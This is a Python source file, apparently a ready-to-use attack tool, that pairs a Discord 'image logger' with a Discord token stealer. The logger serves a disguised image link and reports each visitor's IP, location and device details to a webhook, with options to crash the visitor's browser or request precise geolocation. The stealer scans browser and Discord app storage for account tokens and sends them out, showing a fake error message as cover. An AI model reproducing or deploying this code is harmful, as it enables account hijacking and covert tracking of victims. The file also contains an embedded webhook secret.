from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, os, re, sys

__app__ = "Discord Image Logger & Token Finder"
__description__ = "A combined application for logging IPs and finding Discord tokens."
__version__ = "v2.0"
__author__ = "DeKrypt"

# Configuration for Image Logger
config = {
    "webhook": "https://discord.com/api/webhooks/1340462737817604127/4WzecJCsxl9DzQaYATWyE_oApzE422Y79c9FP6e0LmLulxDj2JEmvI3U3ybfF53J6zDm",  # Replace with your webhook URL
    "image": "https://www.pixelstalk.net/wp-content/uploads/2016/10/Bliss-Widescreen-Wallpaper.jpg",  # Replace with your image URL
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"  # Replace with your redirect URL
    },
}

blacklistedIPs = ("27", "104", "143", "164")  # IPs to block

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
            }
        ],
    }

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
                margin: 0;
                padding: 0;
            }}
            div.img {{
                background-image: url('{url}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }}</style><div class="img"></div>'''.encode()

            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return

            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)

                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()

                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return

    do_GET = handleRequest
    do_POST = handleRequest

# Discord Token Finder Functions
def send_to_webhook(embed, webhook_url):
    payload = {
        'embeds': [embed]
    }
    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print("Embed message sent successfully.")
        else:
            print(f"Failed to send embed message. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending to webhook: {str(e)}")

def find_discord_token(webhook_url):
    paths = {
        'chrome': os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
        'firefox': os.path.expanduser('~') + r'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'discord_app': os.path.expanduser('~') + r'\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
        'opera_gx': os.path.expanduser('~') + r'\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Local Storage\\leveldb'
    }

    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')

    found_token = False

    for browser, path in paths.items():
        try:
            if os.path.exists(path):
                for filename in os.listdir(path):
                    if filename.endswith('.ldb') or filename.endswith('.log'):
                        with open(os.path.join(path, filename), 'r', errors='ignore') as file:
                            content = file.read()
                            tokens = token_pattern.findall(content)
                            if tokens:
                                for token in tokens:
                                    found_token = True
                                    embed = {
                                        'title': 'Discord Token Found',
                                        'description': f'Token found in {browser} storage.',
                                        'color': 15258703,
                                        'fields': [
                                            {
                                                'name': 'Token',
                                                'value': token,
                                                'inline': False
                                            },
                                            {
                                                'name': 'Browser/App',
                                                'value': browser,
                                                'inline': False
                                            }
                                        ]
                                    }
                                    send_to_webhook(embed, webhook_url)

        except Exception as e:
            print(f"An error occurred while searching in {browser}: {str(e)}")

    if found_token:
        print("Exiting.")
    else:
        print("No tokens found.")

    sys.exit()

def simulate_error():
    print("There is a problem with the connection. Please try again later.")

if __name__ == "__main__":
    simulate_error()

    webhook_url = 'YOUR_WEBHOOK'  # Replace with your webhook URL
    find_discord_token(webhook_url)
